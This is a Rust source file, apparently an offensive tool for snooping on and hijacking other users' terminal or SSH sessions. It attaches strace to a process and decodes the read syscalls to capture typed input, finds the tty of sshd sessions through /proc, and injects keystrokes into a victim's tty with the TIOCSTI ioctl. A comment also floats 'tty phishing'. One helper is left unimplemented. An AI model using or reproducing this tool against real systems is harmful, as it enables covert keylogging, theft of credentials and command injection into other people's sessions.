use getch_rs::{enable_echo_input, Getch, Key};
use hex;
use nix::libc::{ioctl, TIOCSTI};
use regex::Regex;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process::{Command, Stdio};

pub fn read(tty: &str) {
    // TODO: Get the PID from the tty
    let pid = pid_of(tty).expect("Failed to get PID");

    println!("Attaching to {}", pid);

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", &pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);
    let re = Regex::new(r#"(?mU)read\(10, "(.*)""#).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                print!(
                    "{}",
                    String::from_utf8(decoded_hex).expect("Failed to encode")
                );
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}

fn pid_of(tty: &str) -> Result<String, std::io::Error> {
    // Given a tty or pty or pts, return the pid of the process that is using it
    todo!("how do I do this?");
}

/// Given the pid of an sshd process, return the tty
/// This only works for sshd because they expose the tty in the cmdline
fn tty_of_sshd(pid: &str) -> Result<String, std::io::Error> {
    // read /proc/$PID/cmdline
    let cmdline = std::fs::read_to_string(format!("/proc/{}/cmdline", pid))?;

    // format: /path/to/sshd: user@tty
    let parts: Vec<&str> = cmdline.split('@').collect();

    if parts.len() != 2 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "Invalid cmdline",
        ));
    } else {
        // prepend /dev/ to tty and return
        Ok(format!("/dev/{}", parts[1]))
    }
}
/// Takes a PID and writes to the stdin of the process
pub fn write(tty: &str, echo: bool) {
    println!("Attaching writer to {}", tty);

    let input = Getch::new();

    if echo {
        enable_echo_input();
    }

    loop {
        match input.getch() {
            Ok(Key::Ctrl('p')) => continue, // TODO: tty phishing?
            Ok(Key::Ctrl('z')) => break,
            Ok(Key::Ctrl('d')) => break,
            Ok(Key::Delete) => {
                // This is actually backspace but the crate we are using is cooked
                "\x08\x1b\x5b\x4b".chars().for_each(|x| write_char(tty, x));
            }
            Ok(Key::Char(c)) => {
                write_char(tty, c);
            }
            _ => {}
        }
    }
}

fn write_char(tty: &str, c: char) {
    let file = std::fs::OpenOptions::new()
        .write(true)
        .open(tty)
        .expect("Failed to open tty");

    let fd = file.as_raw_fd();

    unsafe {
        ioctl(fd, TIOCSTI, &c as *const _ as *const i8);
    }
}
